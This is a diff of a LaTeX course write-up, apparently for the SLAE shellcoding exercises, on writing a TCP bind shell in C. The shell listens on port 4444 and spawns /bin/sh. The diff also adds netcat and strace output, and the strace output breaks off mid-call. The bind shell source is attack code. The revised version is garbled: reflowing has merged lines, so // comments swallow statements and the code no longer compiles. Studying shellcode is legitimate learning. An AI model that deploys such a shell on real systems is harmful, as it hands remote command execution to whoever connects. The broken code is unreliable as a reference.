@@ -1,4 +1,4 @@
-% Created 2016-12-15 Thu 10:02
+% Created 2016-12-15 Thu 12:31
 \documentclass[11pt]{article}
 \usepackage[utf8]{inputenc}
 \usepackage[T1]{fontenc}
@@ -93,53 +93,65 @@ file descriptor won't hurt anyone right? We need to trim the fat!
 So lets get some code going!
 
 \begin{verbatim}
-#include <stdio.h>
-#include <netinet/in.h>
-#define PORT 4444
+#include <stdio.h> include <netinet/in.h> define PORT 4444
 
-int main(int argc, char **argv)
-{
-  // Create a socket
-  int lsock = socket(AF_INET, SOCK_STREAM, 0);
+int main(int argc, char **argv) { // Create a socket int lsock =
+socket(AF_INET, SOCK_STREAM, 0);
 
-  // Setup servr side config struct
-  // We configure:
-  // The family:IPv4
-  // The interface: 0.0.0.0 (any)
-  // The port: port#
-  struct sockaddr_in config;
-  config.sin_family = AF_INET;
-  config.sin_addr.s_addr = INADDR_ANY;
-  config.sin_port = htons(PORT);
+  // Setup servr side config struct // We configure: // The
+  family:IPv4 // The interface: 0.0.0.0 (any) // The port: port#
+  struct sockaddr_in config; config.sin_family = AF_INET;
+  config.sin_addr.s_addr = INADDR_ANY; config.sin_port =
+  htons(PORT);
 
-  // Bind the created socket with the interface
-  // specified in the configuration
-  bind(lsock, (struct sockaddr *)&config, sizeof(config));
+  // Bind the created socket with the interface // specified in the
+  configuration bind(lsock, (struct sockaddr *)&config,
+  sizeof(config));
 
-  // Listen on the socket
-  listen(lsock, 0);
+  // Listen on the socket listen(lsock, 0);
 
-  // Accept the incoming connection
-  int csock = accept(lsock, NULL, NULL);
-  // Redirect stdin, stdout, and stderror
-  dup2(csock, 0);
-  dup2(csock, 1);
-  dup2(csock, 2);
+  // Accept the incoming connection int csock = accept(lsock, NULL,
+  NULL); // Redirect stdin, stdout, and stderror dup2(csock, 0);
+  dup2(csock, 1); dup2(csock, 2);
 
-  // Execute a shell
-  execve("/bin/sh", NULL, NULL);
-};
+  // Execute a shell execve("/bin/sh", NULL, NULL); };
 \end{verbatim}
 
-Compiling this code with \verb~gcc bindshell.c -o bindshell~ gives us a nice
-executable. Running the executable with \verb~./bindshell~ and then looking
-at our network using \verb~netstat -antp~ yields something very interesting\ldots{}
+Compiling this code with \verb~gcc bindshell.c -o bindshell~ gives us a
+nice executable. Running the executable with \verb~./bindshell~ and then
+looking at our network using \verb~netstat -antp~ yields something very
+interesting\ldots{}
 
 \begin{verbatim}
-root@blahblah:~# netstat -atp
-Active Internet connections (servers and established)
-Proto Local Address Foreign Address State   PID/Program name
-tcp   *:4444        *:*             LISTEN  1657/bindshell
+root@blahblah:~# netstat -atp Active Internet connections (servers and
+established) Proto Local Address Foreign Address State PID/Program
+name tcp *:4444 *:* LISTEN 1657/bindshell
+\end{verbatim}
+
+Excellent! We have /bin/sh listen bound to a port. If we open up
+another terminal and use netcat to connect to port 4444 by running \verb~nc -nv -nv 127.0.0.1 4444~ we will get:
+
+\begin{verbatim}
+root@blahblah:~# nc -nv 127.0.0.1 4444 (UNKNOWN) [127.0.0.1] 4444 (?)
+open id uid=0(root) gid=0(root) groups=0(root)
+\end{verbatim}
+
+Perfect! We have a tcp bind shell connection. Now we have to convert
+this to assembly\ldots{}
+\subsection{Analysis of the C program}
+\label{sec-1-4}
+
+We can use a tool called \verb~strace~ to help us learn more about what system calls
+our bind shell c program is making. Running \verb~strace ./bindshell~ and filtering
+filtering out the noise we will see:
+
+\begin{verbatim}
+root@blahblah:~/shared/SLAE/slae/exercise1# strace ./bindshell
+execve("./bindshell", ["./bindshell"], [/* 41 vars */]) = 0
+socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
+bind(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
+listen(3, 0)                            = 0
+accept(3,
 \end{verbatim}
 % Emacs 24.5.1 (Org mode 8.2.10)
 \end{document}
